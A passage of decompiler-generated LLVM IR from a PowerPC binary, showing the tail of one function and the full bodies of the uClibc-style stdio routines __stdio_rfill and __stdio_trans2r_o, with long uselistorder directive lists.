  %v3_1000fdb8 = inttoptr i32 %v2_1000fdb8 to i32*
  store i32 %v0_1000fdb8, i32* %v3_1000fdb8, align 4
  %v0_1000fdbc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000fdbc = load i32, i32* @r9, align 4
  %v2_1000fdbc = sub i32 %v1_1000fdbc, %v0_1000fdbc
  store i32 %v2_1000fdbc, i32* %r0.global-to-local, align 4
  %v1_1000fdc0 = load i32, i32* @r31, align 4
  %v2_1000fdc0 = sub i32 %v1_1000fdc0, %v2_1000fdbc
  store i32 %v2_1000fdc0, i32* @r31, align 4
  br label %dec_label_pc_1000fdc4

dec_label_pc_1000fdc4:                            ; preds = %dec_label_pc_1000fd6c, %dec_label_pc_1000fdb4
  %v0_1000fdc4 = phi i32 [ %v2_1000fdc0, %dec_label_pc_1000fdb4 ], [ %v0_1000fdc4.pre, %dec_label_pc_1000fd6c ]
  %v1_1000fdc4 = load i32, i32* @r27, align 4
  %v2_1000fdc4 = sub i32 %v1_1000fdc4, %v0_1000fdc4
  store i32 %v2_1000fdc4, i32* @r27, align 4
  br label %dec_label_pc_1000fdd8

dec_label_pc_1000fdd8:                            ; preds = %dec_label_pc_1000fd30, %entry, %dec_label_pc_1000fd64, %dec_label_pc_1000fdc4
  store i32 %v0_1000fcec, i32* %r0.global-to-local, align 4
  %v0_1000fddc = load i32, i32* @r27, align 4
  ret i32 %v0_1000fddc

; uselistorder directives
  uselistorder i32 %v0_1000fdb4, { 1, 0 }
  uselistorder i32 %v1_1000fdb0, { 1, 0 }
  uselistorder i32 %v1_1000fdac, { 0, 2, 1 }
  uselistorder i32 %v0_1000fdc4.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v2_1000fd74, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_1000fd34, { 1, 2, 0 }
  uselistorder i32 %v2_1000fd30, { 1, 0 }
  uselistorder i32 %v3_1000fd24, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000fd20, { 1, 0 }
  uselistorder i32* @r11, { 17, 0, 18, 19, 9, 20, 21, 22, 1, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 53, 128, 129, 10, 130, 72, 73, 74, 75, 76, 77, 2, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 3, 97, 68, 69, 70, 71, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 50, 51, 52, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 8, 115, 4, 116, 117, 118, 119, 5, 120, 121, 122, 123, 125, 126, 127, 124, 6, 131, 132, 133, 134, 135, 136, 137, 138, 13, 14, 15, 16, 7, 11, 12 }
  uselistorder i32 256, { 85, 0, 1, 2, 3, 4, 5, 6, 86, 87, 7, 8, 72, 9, 75, 10, 11, 12, 13, 14, 15, 16, 17, 76, 18, 19, 79, 80, 81, 20, 21, 22, 83, 23, 24, 25, 26, 27, 73, 77, 82, 28, 29, 30, 31, 32, 33, 84, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 74, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 78 }
  uselistorder i8 10, { 6, 7, 8, 0, 5, 9, 10, 1, 2, 3, 4 }
  uselistorder i32 11, { 38, 23, 0, 39, 40, 7, 8, 1, 9, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 2, 28, 29, 3, 30, 31, 32, 33, 12, 4, 6, 34, 35, 36, 37, 5 }
  uselistorder i32 268566528, { 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 7, 44, 45, 46, 1, 47, 48, 49, 50, 51, 3, 2, 62, 4, 34, 54, 55, 52, 53, 56, 57, 58, 59, 60, 61, 9, 10, 11, 12, 13, 14, 15, 16, 17, 31, 8, 33, 18, 19, 20, 21, 23, 24, 22, 25, 26, 5, 27, 6, 28, 29, 30, 32 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 0, 2, 1 }
  uselistorder i32 4, { 383, 384, 385, 386, 175, 176, 387, 174, 380, 390, 0, 1, 391, 2, 3, 392, 4, 5, 393, 394, 395, 74, 75, 396, 397, 148, 398, 399, 6, 400, 401, 402, 7, 403, 404, 405, 406, 407, 409, 8, 410, 411, 426, 427, 428, 475, 9, 177, 178, 179, 180, 223, 224, 181, 182, 478, 485, 10, 476, 477, 89, 355, 356, 357, 358, 359, 11, 149, 431, 432, 433, 434, 435, 436, 437, 12, 438, 439, 440, 441, 442, 443, 444, 445, 429, 430, 412, 413, 414, 415, 416, 417, 418, 419, 420, 13, 421, 422, 423, 424, 425, 408, 14, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 15, 16, 86, 17, 462, 463, 466, 464, 465, 150, 18, 467, 90, 468, 469, 470, 471, 472, 473, 474, 151, 20, 19, 183, 388, 389, 479, 480, 481, 152, 482, 483, 484, 21, 312, 153, 22, 225, 226, 227, 228, 229, 23, 230, 79, 154, 155, 92, 156, 157, 158, 159, 185, 186, 187, 96, 87, 188, 168, 169, 189, 190, 170, 171, 24, 191, 192, 193, 194, 184, 195, 80, 196, 197, 81, 198, 172, 93, 204, 205, 94, 207, 208, 95, 209, 210, 211, 206, 199, 200, 201, 202, 203, 212, 100, 98, 97, 99, 213, 214, 215, 82, 216, 217, 83, 218, 219, 220, 221, 222, 101, 77, 231, 232, 233, 234, 25, 235, 236, 237, 238, 106, 239, 240, 26, 27, 105, 104, 241, 28, 102, 103, 242, 243, 29, 244, 245, 111, 246, 247, 30, 31, 110, 109, 248, 107, 249, 108, 250, 251, 252, 117, 253, 32, 33, 254, 255, 34, 256, 257, 258, 116, 259, 35, 36, 115, 114, 260, 112, 113, 37, 261, 262, 263, 160, 118, 264, 265, 38, 266, 267, 91, 268, 39, 269, 76, 120, 119, 270, 121, 122, 271, 272, 40, 273, 274, 275, 123, 276, 41, 42, 125, 124, 277, 126, 127, 278, 279, 280, 281, 131, 282, 43, 283, 284, 44, 285, 286, 287, 288, 45, 289, 129, 128, 290, 130, 161, 291, 292, 293, 294, 46, 295, 297, 298, 132, 299, 300, 133, 47, 48, 162, 296, 135, 134, 136, 137, 301, 302, 303, 304, 305, 163, 164, 49, 306, 308, 309, 138, 310, 311, 139, 50, 51, 165, 307, 141, 140, 142, 143, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 147, 324, 325, 326, 327, 328, 329, 330, 331, 332, 166, 333, 334, 335, 144, 167, 336, 337, 338, 339, 340, 341, 145, 88, 342, 343, 344, 146, 345, 346, 347, 84, 348, 349, 85, 350, 52, 351, 352, 353, 354, 53, 54, 360, 55, 56, 361, 57, 58, 362, 59, 60, 363, 61, 62, 364, 365, 63, 64, 366, 65, 66, 367, 67, 68, 368, 69, 70, 369, 71, 72, 370, 371, 73, 372, 373, 374, 375, 376, 377, 378, 78, 379, 381, 382, 173 }
  uselistorder i32* @r28, { 393, 394, 395, 396, 402, 1, 403, 404, 405, 406, 407, 411, 408, 409, 410, 412, 426, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 300, 301, 98, 97, 8, 428, 431, 345, 346, 347, 427, 414, 415, 413, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 302, 303, 223, 224, 304, 305, 306, 307, 397, 398, 399, 400, 401, 99, 308, 309, 429, 430, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 10, 11, 12, 13, 14, 15, 38, 39, 40, 41, 42, 0, 43, 16, 17, 18, 19, 20, 21, 22, 9, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 65, 66, 67, 57, 58, 59, 60, 61, 62, 63, 64, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 100, 101, 102, 103, 104, 105, 106, 107, 2, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 3, 164, 167, 165, 166, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 4, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 6, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 7, 334, 335, 5, 336, 337, 338, 339, 340, 341, 342, 343, 344, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 382, 381, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392 }
  uselistorder i32 2147483647, { 1, 2, 0 }
  uselistorder i32* @r30, { 1, 199, 200, 201, 202, 203, 204, 205, 206, 24, 215, 0, 2, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 3, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 4, 236, 5, 237, 238, 239, 240, 241, 242, 243, 244, 245, 6, 246, 247, 265, 266, 267, 7, 268, 269, 8, 9, 296, 297, 10, 270, 51, 50, 22, 52, 53, 54, 300, 301, 188, 189, 298, 11, 299, 12, 274, 275, 271, 272, 273, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 276, 277, 278, 279, 280, 281, 282, 283, 23, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 104, 113, 114, 115, 207, 208, 209, 210, 211, 212, 213, 13, 214, 55, 56, 59, 60, 57, 58, 116, 302, 303, 25, 31, 32, 33, 26, 27, 28, 29, 30, 34, 36, 37, 35, 38, 39, 40, 41, 14, 42, 43, 44, 45, 46, 47, 48, 49, 16, 61, 62, 15, 63, 17, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 105, 106, 107, 108, 109, 110, 111, 112, 118, 119, 117, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 18, 176, 177, 19, 178, 179, 180, 181, 182, 183, 185, 186, 184, 20, 187, 190, 21, 191, 192, 193, 194, 195, 196, 197, 198 }
  uselistorder i32* @r27, { 177, 178, 179, 180, 181, 185, 186, 187, 0, 188, 189, 190, 191, 192, 197, 49, 50, 51, 200, 201, 1, 198, 2, 199, 193, 196, 194, 195, 135, 148, 114, 149, 182, 183, 184, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 6, 7, 8, 9, 31, 32, 37, 38, 33, 34, 35, 36, 39, 40, 41, 42, 45, 43, 44, 5, 46, 47, 48, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 3, 90, 91, 92, 95, 96, 93, 94, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 4, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 175, 173, 174, 176 }
  uselistorder i32* @r5, { 51, 4, 52, 1, 56, 57, 0, 58, 59, 60, 61, 62, 63, 64, 71, 67, 68, 65, 66, 53, 54, 72, 73, 74, 75, 2, 69, 70, 55, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 5, 6, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder label %dec_label_pc_1000fdd8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000fdc4, { 1, 0 }
  uselistorder label %dec_label_pc_1000fdb4, { 1, 0 }
  uselistorder label %dec_label_pc_1000fd88, { 1, 0 }
  uselistorder label %dec_label_pc_1000fd1c, { 1, 0 }
  uselistorder label %dec_label_pc_1000fd14, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1000fdf0 = load i32, i32* @lr, align 4
  store i32 %v0_1000fdf0, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1000fe04 = add i32 %arg1, 8
  %v2_1000fe04 = inttoptr i32 %v1_1000fe04 to i32*
  %v3_1000fe04 = load i32, i32* %v2_1000fe04, align 4
  store i32 %v3_1000fe04, i32* @r4, align 4
  %v1_1000fe08 = add i32 %arg1, 12
  %v2_1000fe08 = inttoptr i32 %v1_1000fe08 to i32*
  %v3_1000fe08 = load i32, i32* %v2_1000fe08, align 4
  %v2_1000fe0c = sub i32 %v3_1000fe08, %v3_1000fe04
  store i32 268500500, i32* @lr, align 4
  %v3_1000fe10 = inttoptr i32 %v3_1000fe04 to i16*
  %v4_1000fe10 = call i32 @__stdio_READ(i16* %v3_1000fe10, i32 %v2_1000fe0c, i32 %v2_1000fe0c)
  %v0_1000fe14 = load i32, i32* @r29, align 4
  %v1_1000fe14 = add i32 %v0_1000fe14, 8
  %v2_1000fe14 = inttoptr i32 %v1_1000fe14 to i32*
  %v3_1000fe14 = load i32, i32* %v2_1000fe14, align 4
  store i32 %v3_1000fe14, i32* @r9, align 4
  %v2_1000fe18 = add i32 %v3_1000fe14, %v4_1000fe10
  store i32 %v2_1000fe18, i32* %r0.global-to-local, align 4
  %v2_1000fe1c = add i32 %v0_1000fe14, 16
  %v3_1000fe1c = inttoptr i32 %v2_1000fe1c to i32*
  store i32 %v3_1000fe14, i32* %v3_1000fe1c, align 4
  %v0_1000fe20 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000fe20 = load i32, i32* @r29, align 4
  %v2_1000fe20 = add i32 %v1_1000fe20, 20
  %v3_1000fe20 = inttoptr i32 %v2_1000fe20 to i32*
  store i32 %v0_1000fe20, i32* %v3_1000fe20, align 4
  store i32 %v0_1000fdf0, i32* %r0.global-to-local, align 4
  ret i32 %v4_1000fe10

; uselistorder directives
  uselistorder i32 %v3_1000fe14, { 1, 0, 2 }
  uselistorder i32 %v4_1000fe10, { 1, 0 }
  uselistorder i32 %v3_1000fe04, { 1, 0, 2 }
  uselistorder i32 20, { 85, 86, 18, 87, 90, 91, 92, 93, 95, 98, 99, 19, 25, 26, 20, 21, 82, 83, 1, 96, 97, 94, 88, 89, 27, 0, 28, 29, 17, 14, 22, 2, 3, 4, 23, 24, 30, 5, 31, 32, 33, 34, 35, 15, 36, 37, 38, 39, 40, 41, 42, 43, 6, 44, 45, 46, 47, 48, 49, 50, 51, 7, 52, 53, 54, 55, 56, 57, 58, 8, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 16, 70, 71, 72, 73, 10, 9, 74, 75, 76, 12, 11, 77, 78, 79, 80, 81, 13, 84 }
  uselistorder i32 12, { 103, 104, 27, 28, 105, 106, 108, 109, 110, 113, 114, 120, 121, 122, 29, 30, 31, 54, 55, 32, 33, 102, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 115, 116, 117, 118, 119, 11, 111, 12, 112, 13, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 14, 159, 107, 56, 57, 15, 58, 59, 18, 19, 5, 20, 21, 6, 17, 16, 34, 22, 35, 36, 37, 23, 38, 3, 39, 24, 4, 40, 41, 42, 25, 26, 44, 45, 46, 47, 48, 49, 50, 52, 53, 51, 43, 96, 60, 61, 7, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 8, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 9, 84, 85, 86, 87, 88, 89, 90, 91, 92, 10, 93, 94, 95, 97, 98, 99, 100, 101, 0, 1, 2 }
  uselistorder i32* @r29, { 275, 276, 277, 278, 279, 280, 281, 282, 283, 26, 1, 289, 284, 285, 290, 291, 12, 2, 292, 293, 294, 295, 296, 297, 298, 299, 3, 300, 313, 314, 317, 315, 316, 318, 319, 330, 331, 332, 333, 334, 335, 336, 337, 338, 255, 256, 357, 14, 265, 5, 6, 267, 266, 4, 13, 15, 356, 27, 28, 340, 341, 342, 343, 7, 344, 339, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 345, 346, 347, 348, 349, 350, 8, 9, 351, 352, 353, 354, 355, 240, 241, 257, 258, 204, 205, 259, 260, 261, 262, 29, 30, 286, 287, 288, 91, 92, 93, 94, 95, 96, 263, 264, 358, 359, 31, 32, 16, 17, 33, 34, 35, 36, 37, 38, 39, 18, 19, 20, 21, 22, 23, 24, 25, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 77, 78, 79, 80, 81, 73, 74, 75, 76, 40, 41, 42, 82, 83, 84, 85, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 10, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 11, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 268, 0, 269, 270, 271, 272, 273, 274 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000fe40 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000fe4c = load i16, i16* %arg1, align 2
  %v4_1000fe4c = zext i16 %v3_1000fe4c to i32
  %v2_1000fe50 = and i32 %v4_1000fe4c, %arg2
  %v5_1000fe50 = icmp eq i32 %v2_1000fe50, 0
  br i1 %v5_1000fe50, label %dec_label_pc_1000fe58, label %dec_label_pc_1000fe68

dec_label_pc_1000fe58:                            ; preds = %entry
  %v1_1000fe58 = and i32 %v4_1000fe4c, 2176
  %v3_1000fe58 = icmp eq i32 %v1_1000fe58, 0
  store i1 %v3_1000fe58, i1* @cr0_eq, align 1
  br i1 %v3_1000fe58, label %dec_label_pc_1000fe60, label %dec_label_pc_1000fe74

dec_label_pc_1000fe60:                            ; preds = %dec_label_pc_1000fe58
  %v2_1000fe60 = or i32 %v4_1000fe4c, %arg2
  %v1_1000fe64 = trunc i32 %v2_1000fe60 to i16
  store i16 %v1_1000fe64, i16* %arg1, align 2
  %v0_1000fe68.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000fe68

dec_label_pc_1000fe68:                            ; preds = %entry, %dec_label_pc_1000fe60
  %v0_1000fe68 = phi i32 [ %tmp, %entry ], [ %v0_1000fe68.pre, %dec_label_pc_1000fe60 ]
  %v1_1000fe68 = inttoptr i32 %v0_1000fe68 to i16*
  %v2_1000fe68 = load i16, i16* %v1_1000fe68, align 2
  %v3_1000fe68 = zext i16 %v2_1000fe68 to i32
  %v1_1000fe6c = and i32 %v3_1000fe68, 16
  %v3_1000fe6c = icmp eq i32 %v1_1000fe6c, 0
  store i1 %v3_1000fe6c, i1* @cr0_eq, align 1
  br i1 %v3_1000fe6c, label %dec_label_pc_1000fe9c, label %dec_label_pc_1000fe74

dec_label_pc_1000fe74:                            ; preds = %dec_label_pc_1000fe58, %dec_label_pc_1000fe68
  %v0_1000fe80 = load i32, i32* @r2, align 4
  %v1_1000fe84 = add i32 %v0_1000fe80, -28672
  store i32 %v1_1000fe84, i32* @r9, align 4
  %v2_1000fe88 = inttoptr i32 %v1_1000fe84 to i32*
  store i32 9, i32* %v2_1000fe88, align 4
  br label %dec_label_pc_1000fe8c

dec_label_pc_1000fe8c:                            ; preds = %dec_label_pc_1000fea4, %dec_label_pc_1000fe74
  %v0_1000fe8c = load i32, i32* @r31, align 4
  %v1_1000fe8c = inttoptr i32 %v0_1000fe8c to i16*
  %v2_1000fe8c = load i16, i16* %v1_1000fe8c, align 2
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000fe94 = or i16 %v2_1000fe8c, 8
  br label %dec_label_pc_1000fed0

dec_label_pc_1000fe9c:                            ; preds = %dec_label_pc_1000fe68
  %v1_1000fe9c = and i32 %v3_1000fe68, 64
  store i32 %v1_1000fe9c, i32* @r9, align 4
  %v3_1000fe9c = icmp eq i32 %v1_1000fe9c, 0
  store i1 %v3_1000fe9c, i1* @cr0_eq, align 1
  br i1 %v3_1000fe9c, label %dec_label_pc_1000fec4, label %dec_label_pc_1000fea4

dec_label_pc_1000fea4:                            ; preds = %dec_label_pc_1000fe9c
  store i32 268500648, i32* @lr, align 4
  %v2_1000fea4 = call i32 @__stdio_wcommit(i32 %v1_1000fe9c, i32 %arg2)
  store i32 %v2_1000fea4, i32* %r3.global-to-local, align 4
  %v3_1000fea8 = icmp eq i32 %v2_1000fea4, 0
  br i1 %v3_1000fea8, label %dec_label_pc_1000feb0, label %dec_label_pc_1000fe8c

dec_label_pc_1000feb0:                            ; preds = %dec_label_pc_1000fea4
  %v0_1000feb0 = load i32, i32* @r31, align 4
  %v1_1000feb0 = inttoptr i32 %v0_1000feb0 to i16*
  %v2_1000feb0 = load i16, i16* %v1_1000feb0, align 2
  %v3_1000feb0 = zext i16 %v2_1000feb0 to i32
  %v1_1000feb4 = add i32 %v0_1000feb0, 8
  %v2_1000feb4 = inttoptr i32 %v1_1000feb4 to i32*
  %v3_1000feb4 = load i32, i32* %v2_1000feb4, align 4
  store i32 %v3_1000feb4, i32* @r9, align 4
  %v1_1000feb8 = call i32 @__asm_rlwinm(i32 %v3_1000feb0, i32 0, i32 26, i32 24)
  %v2_1000feb8 = trunc i32 %v1_1000feb8 to i16
  %v0_1000febc = load i32, i32* @r9, align 4
  %v1_1000febc = load i32, i32* @r31, align 4
  %v2_1000febc = add i32 %v1_1000febc, 28
  %v3_1000febc = inttoptr i32 %v2_1000febc to i32*
  store i32 %v0_1000febc, i32* %v3_1000febc, align 4
  %v3_1000fec0 = load i32, i32* @r31, align 4
  %v4_1000fec0 = inttoptr i32 %v3_1000fec0 to i16*
  store i16 %v2_1000feb8, i16* %v4_1000fec0, align 2
  %v0_1000fec4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000fec4

dec_label_pc_1000fec4:                            ; preds = %dec_label_pc_1000fe9c, %dec_label_pc_1000feb0
  %v0_1000fec4 = phi i32 [ %v0_1000fe68, %dec_label_pc_1000fe9c ], [ %v0_1000fec4.pre, %dec_label_pc_1000feb0 ]
  %v1_1000fec4 = inttoptr i32 %v0_1000fec4 to i16*
  %v2_1000fec4 = load i16, i16* %v1_1000fec4, align 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000fecc = or i16 %v2_1000fec4, 1
  br label %dec_label_pc_1000fed0

dec_label_pc_1000fed0:                            ; preds = %dec_label_pc_1000fe8c, %dec_label_pc_1000fec4
  %v2_1000fed0 = phi i32 [ %v0_1000fe8c, %dec_label_pc_1000fe8c ], [ %v0_1000fec4, %dec_label_pc_1000fec4 ]
  %storemerge.off0 = phi i16 [ %v1_1000fe94, %dec_label_pc_1000fe8c ], [ %v1_1000fecc, %dec_label_pc_1000fec4 ]
  %v3_1000fed0 = inttoptr i32 %v2_1000fed0 to i16*
  store i16 %storemerge.off0, i16* %v3_1000fed0, align 2
  store i32 %v0_1000fe40, i32* @r31, align 4
  %v0_1000fee4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000fee4

; uselistorder directives
  uselistorder i32 %v4_1000fe4c, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 4, 0 }
  uselistorder i32 28, { 41, 7, 42, 6, 43, 44, 45, 46, 47, 48, 16, 17, 8, 9, 57, 2, 50, 51, 52, 49, 53, 56, 54, 55, 4, 5, 3, 10, 12, 13, 14, 15, 11, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0, 37, 38, 39, 1, 40 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 31, 1, 2, 3, 32, 36, 37, 38, 39, 40, 41, 42, 43, 74, 75, 76, 77, 80, 0, 81, 20, 30, 78, 52, 53, 54, 55, 56, 57, 58, 59, 51, 45, 46, 47, 48, 49, 50, 44, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 73, 70, 71, 72, 4, 6, 7, 33, 34, 35, 5, 79, 21, 22, 23, 24, 8, 9, 10, 12, 11, 13, 14, 15, 17, 18, 16, 19, 25, 26, 27, 28, 29, 82 }
  uselistorder i32 24, { 89, 90, 13, 14, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 7, 102, 105, 106, 15, 28, 29, 16, 17, 87, 103, 104, 101, 30, 31, 8, 9, 0, 79, 80, 81, 82, 83, 84, 18, 19, 10, 11, 12, 20, 21, 22, 24, 25, 26, 27, 23, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 1, 46, 47, 48, 49, 50, 51, 2, 52, 53, 54, 55, 56, 3, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 4, 71, 72, 73, 74, 75, 76, 77, 78, 5, 85, 86, 88, 6 }
  uselistorder i32 26, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32 8, { 135, 136, 137, 138, 139, 140, 60, 61, 141, 3, 142, 46, 134, 4, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 161, 171, 172, 219, 220, 62, 63, 64, 65, 74, 75, 221, 222, 20, 111, 120, 173, 174, 175, 176, 177, 178, 179, 5, 180, 181, 182, 183, 184, 185, 186, 187, 162, 163, 164, 165, 166, 167, 168, 169, 170, 160, 188, 189, 190, 191, 6, 192, 193, 7, 194, 195, 196, 197, 198, 199, 200, 201, 8, 202, 203, 204, 205, 206, 207, 9, 208, 209, 210, 10, 11, 12, 211, 212, 213, 214, 215, 216, 217, 13, 218, 143, 144, 145, 14, 223, 15, 76, 77, 78, 79, 112, 47, 48, 25, 27, 26, 28, 30, 29, 31, 49, 50, 32, 66, 16, 17, 18, 67, 68, 69, 71, 72, 73, 70, 105, 51, 52, 53, 54, 55, 80, 33, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 56, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 21, 104, 106, 107, 108, 109, 22, 110, 23, 57, 113, 58, 114, 24, 115, 116, 117, 118, 119, 34, 35, 36, 121, 37, 122, 38, 123, 39, 124, 40, 125, 41, 126, 127, 42, 128, 43, 129, 44, 130, 45, 131, 19, 132, 133, 59, 0, 1, 2 }
  uselistorder i32 (i32, i32)* @__stdio_wcommit, { 3, 2, 1, 0 }
  uselistorder i32 64, { 22, 23, 12, 13, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 20, 15, 16, 0, 1, 2, 3, 17, 14, 18, 19, 4, 5, 21, 6, 7, 8, 9, 10, 11 }
